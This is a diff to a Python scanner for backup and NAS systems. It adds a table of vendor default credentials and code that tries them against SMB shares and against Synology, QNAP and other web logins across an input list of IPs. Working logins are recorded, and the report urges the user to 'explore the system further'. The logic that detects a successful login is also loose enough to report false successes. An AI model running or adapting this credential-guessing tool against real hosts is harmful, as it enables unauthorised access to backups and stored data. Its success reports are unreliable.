@@ -163,6 +163,41 @@ NAS_SYSTEMS = {
     }
 }
 
+# Default credentials for common backup/NAS systems
+DEFAULT_CREDS = {
+    'synology': [
+        ('admin', ''),
+        ('admin', 'admin'),
+        ('admin', 'password'),
+    ],
+    'qnap': [
+        ('admin', 'admin'),
+        ('admin', ''),
+        ('admin', 'password'),
+    ],
+    'truenas': [
+        ('root', 'freenas'),
+        ('root', 'truenas'),
+        ('admin', 'admin'),
+    ],
+    'netgear': [
+        ('admin', 'password'),
+        ('admin', 'netgear1'),
+        ('admin', ''),
+    ],
+    'buffalo': [
+        ('admin', 'password'),
+        ('admin', ''),
+    ],
+    'smb_backup': [
+        ('backup', 'backup'),
+        ('backup', ''),
+        ('administrator', 'backup'),
+        ('backupuser', 'backup'),
+        ('veeam', 'veeam'),
+    ]
+}
+
 # Banner - ASCII version for Windows compatibility
 BANNER = f"""{CYAN}{BOLD}
 =========================================================================
@@ -305,6 +340,87 @@ def check_smb_backup_shares(ip, timeout=3):
         pass
     
     return backup_shares
+
+
+def test_smb_credentials(ip, share, username, password, timeout=3):
+    """
+    Test SMB credentials on a share
+    Returns: (success, file_list) tuple
+    """
+    try:
+        # Build smbclient command
+        if password:
+            cmd = ['smbclient', f'//{ip}/{share}', password, '-U', username, '-c', 'ls', '--timeout', str(timeout)]
+        else:
+            cmd = ['smbclient', f'//{ip}/{share}', '-U', f'{username}%', '-c', 'ls', '--timeout', str(timeout)]
+        
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
+        
+        if result.returncode == 0 and 'NT_STATUS' not in result.stdout:
+            # Extract first few files/folders
+            files = []
+            for line in result.stdout.split('\n'):
+                line = line.strip()
+                if line and not line.startswith('.') and ('D' in line or '<DIR>' in line or 'A' in line):
+                    parts = line.split()
+                    if parts:
+                        files.append(parts[0])
+                if len(files) >= 5:  # Limit to first 5 items
+                    break
+            return True, files
+        return False, []
+    except:
+        return False, []
+
+
+def test_nas_web_login(ip, port, username, password, nas_type, timeout=5):
+    """
+    Test web login for NAS systems
+    Returns: (success, details) tuple
+    """
+    try:
+        if nas_type == 'synology':
+            # Synology DSM API login
+            url = f'http://{ip}:{port}/webapi/auth.cgi'
+            data = {
+                'api': 'SYNO.API.Auth',
+                'version': '3',
+                'method': 'login',
+                'account': username,
+                'passwd': password,
+                'session': 'FileStation',
+                'format': 'cookie'
+            }
+            response = requests.get(url, params=data, timeout=timeout, verify=False)
+            if response.status_code == 200:
+                result = response.json()
+                if result.get('success'):
+                    return True, f"Synology DSM - Logged in successfully"
+                    
+        elif nas_type == 'qnap':
+            # QNAP login attempt
+            url = f'http://{ip}:{port}/cgi-bin/authLogin.cgi'
+            data = {
+                'user': username,
+                'pwd': password
+            }
+            response = requests.post(url, data=data, timeout=timeout, verify=False)
+            if 'authPassed' in response.text or response.status_code == 200:
+                return True, f"QNAP QTS - Login successful"
+                
+        # Generic check - if we get something other than 401/403, might have worked
+        for protocol in ['http', 'https']:
+            try:
+                url = f'{protocol}://{ip}:{port}/'
+                response = requests.get(url, auth=(username, password), timeout=timeout, verify=False)
+                if response.status_code not in [401, 403]:
+                    return True, f"HTTP Auth successful (Status: {response.status_code})"
+            except:
+                continue
+                
+        return False, None
+    except:
+        return False, None
 
 
 def identify_backup_system(open_ports):
@@ -545,10 +661,76 @@ def scan_host(ip, args):
                 result['web_interfaces'].extend(acronis_web)
         
         # Check for backup shares (if SMB ports are open)
-        if args.full:
+        if args.full or args.test_creds:
             backup_shares = check_smb_backup_shares(ip, timeout=args.timeout)
             if backup_shares:
                 result['backup_shares'] = backup_shares
+        
+        # Test default credentials if enabled
+        if args.test_creds:
+            result['cred_results'] = []
+            
+            # Test SMB shares with default creds
+            if result['backup_shares']:
+                print(f"{YELLOW}[*] Testing default credentials on SMB shares...{RESET}")
+                for share in result['backup_shares']:
+                    for username, password in DEFAULT_CREDS['smb_backup']:
+                        success, files = test_smb_credentials(ip, share, username, password, timeout=args.timeout)
+                        if success:
+                            pwd_display = password if password else '[blank]'
+                            result['cred_results'].append({
+                                'type': 'smb',
+                                'share': share,
+                                'username': username,
+                                'password': pwd_display,
+                                'files': files
+                            })
+                            print(f"{GREEN}[+] SMB {share} - Success: {username}:{pwd_display}{RESET}")
+                            break  # Found working creds, move to next share
+            
+            # Test NAS web interfaces with default creds
+            for system in result['identified_systems']:
+                system_name = system.get('system', '').lower()
+                nas_type = None
+                
+                # Determine NAS type
+                if 'synology' in system_name:
+                    nas_type = 'synology'
+                    creds = DEFAULT_CREDS['synology']
+                elif 'qnap' in system_name:
+                    nas_type = 'qnap'
+                    creds = DEFAULT_CREDS['qnap']
+                elif 'truenas' in system_name or 'freenas' in system_name:
+                    nas_type = 'truenas'
+                    creds = DEFAULT_CREDS['truenas']
+                elif 'netgear' in system_name or 'readynas' in system_name:
+                    nas_type = 'netgear'
+                    creds = DEFAULT_CREDS['netgear']
+                elif 'buffalo' in system_name or 'terastation' in system_name:
+                    nas_type = 'buffalo'
+                    creds = DEFAULT_CREDS['buffalo']
+                else:
+                    continue
+                
+                print(f"{YELLOW}[*] Testing {nas_type.upper()} default credentials...{RESET}")
+                ports = system.get('ports', [])
+                for port in ports:
+                    for username, password in creds:
+                        success, details = test_nas_web_login(ip, port, username, password, nas_type, timeout=args.timeout)
+                        if success:
+                            pwd_display = password if password else '[blank]'
+                            result['cred_results'].append({
+                                'type': 'nas_web',
+                                'nas_type': nas_type,
+                                'port': port,
+                                'username': username,
+                                'password': pwd_display,
+                                'details': details
+                            })
+                            print(f"{GREEN}[+] {nas_type.upper()} Web - Success: {username}:{pwd_display}{RESET}")
+                            break  # Found working creds
+                    if result.get('cred_results') and result['cred_results'][-1].get('nas_type') == nas_type:
+                        break  # Found working creds, don't test other ports
     
     except KeyboardInterrupt:
         raise
@@ -616,6 +798,38 @@ def save_details(results, filename='backup_details.txt'):
                             f.write(f"  • \\\\{result['ip']}\\{share}\n")
                         f.write(f"\n")
                     
+                    # Credential test results
+                    if result.get('cred_results'):
+                        f.write(f"{'-' * 80}\n")
+                        f.write(f"DEFAULT CREDENTIAL TEST RESULTS:\n")
+                        f.write(f"{'-' * 80}\n\n")
+                        
+                        for cred in result['cred_results']:
+                            if cred['type'] == 'smb':
+                                f.write(f"✓ SMB SHARE ACCESS:\n")
+                                f.write(f"  Share: \\\\{result['ip']}\\{cred['share']}\n")
+                                f.write(f"  Username: {cred['username']}\n")
+                                f.write(f"  Password: {cred['password']}\n")
+                                if cred['files']:
+                                    f.write(f"  Sample files/folders:\n")
+                                    for file in cred['files']:
+                                        f.write(f"    - {file}\n")
+                                f.write(f"\n")
+                            
+                            elif cred['type'] == 'nas_web':
+                                f.write(f"✓ NAS WEB LOGIN:\n")
+                                f.write(f"  System: {cred['nas_type'].upper()}\n")
+                                f.write(f"  URL: http://{result['ip']}:{cred['port']}\n")
+                                f.write(f"  Username: {cred['username']}\n")
+                                f.write(f"  Password: {cred['password']}\n")
+                                f.write(f"  Details: {cred['details']}\n")
+                                f.write(f"\n")
+                        
+                        f.write(f"NOTE: Use these credentials to explore the system further!\n")
+                        f.write(f"      For SMB: smbclient //{result['ip']}/share -U username\n")
+                        f.write(f"      For NAS Web: Navigate to URL in browser\n")
+                        f.write(f"\n")
+                    
                     # Exploitation notes
                     f.write(f"Exploitation Notes:\n")
                     for system in result['identified_systems']:
@@ -675,6 +889,7 @@ Backup Systems Detected:
     
     parser.add_argument('input_file', help='File containing IP addresses')
     parser.add_argument('--full', action='store_true', help='Full scan (all backup systems)')
+    parser.add_argument('--test-creds', action='store_true', help='Test default credentials on found systems')
     parser.add_argument('--veeam', dest='veeam_only', action='store_true', help='Scan for Veeam only')
     parser.add_argument('--acronis', dest='acronis_only', action='store_true', help='Scan for Acronis only')
     parser.add_argument('-w', '--workers', type=int, default=10, help='Number of concurrent workers (default: 10)')
